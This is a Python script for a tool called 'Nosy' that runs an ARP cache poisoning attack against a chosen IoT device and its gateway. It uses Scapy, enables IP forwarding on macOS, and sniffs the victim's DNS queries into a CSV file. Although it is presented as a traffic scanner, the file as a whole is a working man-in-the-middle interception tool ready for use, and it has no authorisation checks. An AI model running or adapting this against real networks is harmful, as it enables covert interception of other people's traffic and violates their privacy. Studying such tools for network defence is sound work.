'''
This is the main code of Nosy which is the Network Traffic Scanning 
It uses ARP Cache poisoning, poisoning the gateway and IOT Device to track the network deice
This code makes use of Scapy as a Network Traffic Scanner and this version is specific to MAC OS
Scapy then collects the ARP traffic and resolve the DNS 
As this code runs indefinitely, the data is saved in a CSV to be output realtime 
'''
from scapy.all import *
import threading 
import os
import sys
from datetime import datetime 
import csv
import signal 

#Getting Mac Addresses of IP Address
def get_MACaddress(ip):
  pack = Ether (dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip, hwdst="ff:ff:ff:ff:ff:ff")
  resp = srp1(pack, verbose=0, timeout=2)
  if resp:
    return resp.hwsrc
  else: 
    return None 

#Poisoning Victim 
def v_poison():
  p = Ether(dst=V_MAC) / ARP (psrc=GW_IP, pdst=V_IP, hwdst=V_MAC)
  while True: 
   try:
     srp1(p, verbose=0, timeout=1)
   except KeyboardInterrupt:
     restore(GW_IP, V_IP)
     os.system("sysctl -w net.inet.ip.forwarding=0")
     os.kill(os.getpid(), signal.SIGTERM)


#Restoring ARP Poison
def restore(GW_IP, V_IP):
  victimMAC = get_MACaddress(V_IP)
  routerMAC = get_MACaddress(GW_IP)
  send(ARP(op=2, pdst = GW_IP, psrc = V_IP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count=4)
  send(ARP(op=2, pdst = V_IP, psrc = GW_IP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = routerMAC), count=4)

#Gateway Poison
def gw_poison():
    p = Ether(dst=GW_MAC) / ARP(psrc=V_IP, pdst=GW_IP, hwdst=GW_MAC)
    while True:
      try:
        srp1(p,verbose=0, timeout=1)
      except KeyboardInterrupt:
        restore(GW_IP, V_IP)
        os.system("sysctl -w net.inet.ip.forwarding=0")
        os.kill(os.getpid(), signal.SIGTERM)

#DNS Sniffing 
def sniff_request():
  sniff(iface = INTERFACE, filter = "udp port 53",count = 100, prn=dns_sniff_request)

fieldnames = ["DNS Host", "Bytes"]
with open('data.csv','w') as csv_file:
  csv_writer = csv.DictWriter(csv_file, fieldnames = fieldnames)
  csv_writer.writeheader()

def dns_sniff_request(pkt):
            try: 
              pkt.getlayer(IP).src
              pkt.getlayer(Ether).src
            except AttributeError:
              return
            if (
                pkt.getlayer(IP).src == V_IP
                and pkt.getlayer(Ether).src == V_MAC
                and pkt.haslayer(DNS) 
                and pkt.getlayer(DNS).qr == 0
               ):
                date = datetime.now().strftime("[%Y-%m-%d-%H:%M:%S]")
                #Writing to a CSV File
                length = str(len(pkt))
                with open('data.csv','a') as csv_file:
                  csv_writer = csv.DictWriter(csv_file, fieldnames=fieldnames)
                  info = {
                    "DNS Host": pkt.getlayer(DNS).qd.qname,
                    "Bytes": length
                  }
                  csv_writer.writerow(info)
#                print(date + " Service: DNS" + " Victim " + pkt.getlayer(IP).src + " (" + pkt.getlayer(Ether).src + ") is resolving " + pkt.getlayer(DNS).qd.qname + " with " + str(len(pkt)) + " bytes in length.")


#Constant inputs -> Can ask from user also 
print("Welcome to Nosy Network Traffic Scanner!\n")
print("Inputs for Router's IP Address and Network Card are *OPTIONAL*")
print("Press <Enter> button to skip inputs")
print("Input for IOT's IP Address is *COMPULSORY*\n")

DEFAULT_GATEWAY_IP = "192.168.0.1"
DEFAULT_INTERFACE = "en0"
GW_IP = raw_input(
	'Insert Router IP address [Default "' + DEFAULT_GATEWAY_IP + '"]: '
)
INTERFACE = raw_input(
	'Insert the Network [Default "' + DEFAULT_INTERFACE + '"]: '
)
V_IP = raw_input("Put in Target IOT's IP Address: ")

if GW_IP is None or GW_IP == "":
	GW_IP = DEFAULT_GATEWAY_IP
if INTERFACE is None or INTERFACE == "":
	INTERFACE = DEFAULT_INTERFACE

#Getting MAC Addresses of Devices
while True:
  V_MAC = get_MACaddress(V_IP)
  GW_MAC = get_MACaddress(GW_IP)
  if V_MAC is None:
    print("Cannot find IOT MAC Address (" + V_IP + "), retrying...")
  elif GW_MAC is None:
    print("Cannot find IOT MAC Address (" + GW_IP + "), retrying...")
  else:
    break


#Showing ARP Spoofing targets
print("IOT: " + V_IP + " (" + V_MAC + ")")
print("Home Router: " + GW_IP + " (" + GW_MAC + ")")

os.system("sysctl -w net.inet.ip.forwarding=1")
vthread=[]
gwthread=[]
print("Displaying Network Traffic on Graphs")
print("Press CTRL-C to stop scanning")


#Main Program Loop 
while True:
  vpoison = threading.Thread(target=v_poison)
  vpoison.setDaemon(True)
  vthread.append(vpoison)
  vpoison.start()

  gwpoison = threading.Thread(target=gw_poison)
  gwpoison.setDaemon(True)
  gwthread.append(gwpoison)
  gwpoison.start()

  sniff_request()


